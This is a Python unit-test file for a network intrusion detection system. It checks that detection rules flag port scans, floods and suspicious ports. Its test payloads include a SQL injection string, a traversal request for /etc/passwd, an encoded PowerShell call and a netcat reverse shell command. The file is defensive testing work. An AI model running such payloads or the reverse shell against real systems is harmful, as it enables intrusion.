#!/usr/bin/env python3
"""
test_nids.py – Unit tests + demo runner for the NIDS
Run:  python test_nids.py
"""

import sys
import os
import json

# ── Make sure we can import nids from the same directory ─────
sys.path.insert(0, os.path.dirname(__file__))

# ── Scapy availability check ─────────────────────────────────
try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

from nids import DetectionRules, AlertManager, ResponseEngine, generate_report


# ══════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════
def make_tcp(src, dst, dport, flags="S", payload=None):
    pkt = IP(src=src, dst=dst) / TCP(dport=dport, flags=flags)
    if payload:
        pkt = pkt / Raw(load=payload)
    return pkt

def make_udp(src, dst, dport):
    return IP(src=src, dst=dst) / UDP(dport=dport)

def make_icmp(src, dst):
    return IP(src=src, dst=dst) / ICMP()


PASS = "✅ PASS"
FAIL = "❌ FAIL"

def check(label, condition):
    status = PASS if condition else FAIL
    print(f"  {status}  {label}")
    return condition


# ══════════════════════════════════════════════════════════════
# TEST CASES
# ══════════════════════════════════════════════════════════════
def run_tests():
    if not SCAPY_OK:
        print("  ⚠️  scapy not installed – skipping packet-level tests.")
        print("  Install with:  pip install scapy")
        return 0, 0

    rules  = DetectionRules()
    passed = 0
    total  = 0

    print("\n  ── Rule Tests ────────────────────────────────────────")

    # 1. Port scan – collect all alerts across all packets
    all_alerts = []
    for p in range(1, 15):
        all_alerts += rules.analyze(make_tcp("1.1.1.1", "2.2.2.2", p))
    fired = any(a["threat_type"] == "Port Scan" for a in all_alerts)
    total += 1; passed += check("Port scan detection", fired)

    # 2. SYN flood – collect all alerts
    rules2 = DetectionRules()
    all_alerts2 = []
    for _ in range(55):
        all_alerts2 += rules2.analyze(make_tcp("3.3.3.3", "4.4.4.4", 80, flags="S"))
    fired = any(a["threat_type"] == "SYN Flood (DoS)" for a in all_alerts2)
    total += 1; passed += check("SYN flood detection", fired)

    # 3. ICMP flood – collect all alerts
    rules3 = DetectionRules()
    all_alerts3 = []
    for _ in range(35):
        all_alerts3 += rules3.analyze(make_icmp("5.5.5.5", "6.6.6.6"))
    fired = any(a["threat_type"] == "ICMP Flood (Ping Flood)" for a in all_alerts3)
    total += 1; passed += check("ICMP flood detection", fired)

    # 4. Suspicious port – Telnet
    rules4 = DetectionRules()
    alerts = rules4.analyze(make_tcp("7.7.7.7", "8.8.8.8", 23, flags="PA"))
    fired  = any(a["threat_type"] == "Suspicious Port Access" for a in alerts)
    total += 1; passed += check("Suspicious port (Telnet/23)", fired)

    # 5. SQL injection payload
    rules5 = DetectionRules()
    alerts = rules5.analyze(make_tcp("9.9.9.9", "10.0.0.1", 80, flags="PA",
                                      payload=b"GET /login?id=1 UNION SELECT * FROM users"))
    fired  = any(a["threat_type"] == "Malicious Payload" for a in alerts)
    total += 1; passed += check("SQL injection payload", fired)

    # 6. Directory traversal
    rules6 = DetectionRules()
    alerts = rules6.analyze(make_tcp("11.0.0.1", "12.0.0.1", 80, flags="PA",
                                      payload=b"GET /../../etc/passwd"))
    fired  = any(a["threat_type"] == "Malicious Payload" for a in alerts)
    total += 1; passed += check("Directory traversal payload", fired)

    # 7. PowerShell execution
    rules7 = DetectionRules()
    alerts = rules7.analyze(make_tcp("13.0.0.1", "14.0.0.1", 443, flags="PA",
                                      payload=b"powershell -enc base64str"))
    fired  = any(a["threat_type"] == "Malicious Payload" for a in alerts)
    total += 1; passed += check("PowerShell payload detection", fired)

    # 8. Reverse shell (nc)
    rules8 = DetectionRules()
    alerts = rules8.analyze(make_tcp("15.0.0.1", "16.0.0.1", 1234, flags="PA",
                                      payload=b"nc -e /bin/sh 15.0.0.1 4444"))
    fired  = any(a["threat_type"] == "Malicious Payload" for a in alerts)
    total += 1; passed += check("Netcat reverse shell detection", fired)

    # 9. Clean packet – should produce NO alerts
    rules9 = DetectionRules()
    alerts = rules9.analyze(make_tcp("20.0.0.1", "20.0.0.2", 443))
    total += 1; passed += check("Clean HTTPS packet – no false positive", len(alerts) == 0)

    # 10. Metasploit port
    rules10 = DetectionRules()
    alerts  = rules10.analyze(make_tcp("21.0.0.1", "21.0.0.2", 4444))
    fired   = any(a["threat_type"] == "Suspicious Port Access" for a in alerts)
    total += 1; passed += check("Metasploit port (4444) detection", fired)

    print(f"\n  Result: {passed}/{total} tests passed")
    return passed, total


# ══════════════════════════════════════════════════════════════
# DEMO REPORT
# ══════════════════════════════════════════════════════════════
def generate_sample_report():
    """Create a sample report with synthetic alerts (no live traffic needed)."""
    from datetime import datetime
    import random

    scenarios = [
        ("Port Scan",              "HIGH",     "192.168.1.100", "192.168.1.1"),
        ("SYN Flood (DoS)",        "CRITICAL", "10.0.0.50",     "192.168.1.1"),
        ("ICMP Flood (Ping Flood)","HIGH",     "10.0.0.51",     "192.168.1.1"),
        ("Suspicious Port Access", "MEDIUM",   "10.0.0.52",     "192.168.1.10"),
        ("Malicious Payload",      "CRITICAL", "10.0.0.53",     "192.168.1.20"),
        ("Malicious Payload",      "CRITICAL", "10.0.0.54",     "192.168.1.30"),
        ("Suspicious Port Access", "MEDIUM",   "10.0.0.55",     "192.168.1.40"),
        ("Port Scan",              "HIGH",     "10.0.0.56",     "192.168.1.1"),
        ("SYN Flood (DoS)",        "CRITICAL", "10.0.0.57",     "192.168.1.1"),
        ("Malicious Payload",      "CRITICAL", "10.0.0.58",     "192.168.1.50"),
        ("Suspicious Port Access", "MEDIUM",   "10.0.0.59",     "192.168.1.60"),
        ("ICMP Flood (Ping Flood)","HIGH",     "10.0.0.60",     "192.168.1.1"),
    ]

    descriptions = {
        "Port Scan":               "Source scanned 10+ unique ports in 5s",
        "SYN Flood (DoS)":         "50+ SYN packets/second – potential DoS",
        "ICMP Flood (Ping Flood)": "30+ ICMP packets/second – ping flood",
        "Suspicious Port Access":  "Traffic to high-risk port detected",
        "Malicious Payload":       "Attack signature matched in packet payload",
    }

    alerts = []
    for threat, sev, src, dst in scenarios:
        alerts.append({
            "threat_type": threat,
            "severity":    sev,
            "src":         src,
            "dst":         dst,
            "description": descriptions[threat],
            "timestamp":   datetime.now().isoformat(),
        })

    # Write to log
    os.makedirs("logs", exist_ok=True)
    with open("logs/alerts.json", "w") as f:
        for a in alerts:
            f.write(json.dumps(a) + "\n")

    generate_report(alerts, out_dir="reports")
    print(f"\n  Sample report generated → reports/report.html")


# ══════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("\n" + "═" * 60)
    print("  NIDS Test Suite")
    print("═" * 60)

    passed, total = run_tests()

    print("\n" + "═" * 60)
    print("  Generating sample report…")
    print("═" * 60)
    generate_sample_report()

    print("\n" + "═" * 60)
    success = (passed == total) if total > 0 else True
    print(f"  {'All tests passed ✅' if success else 'Some tests failed ❌'}")
    print("═" * 60 + "\n")
    sys.exit(0 if success else 1)
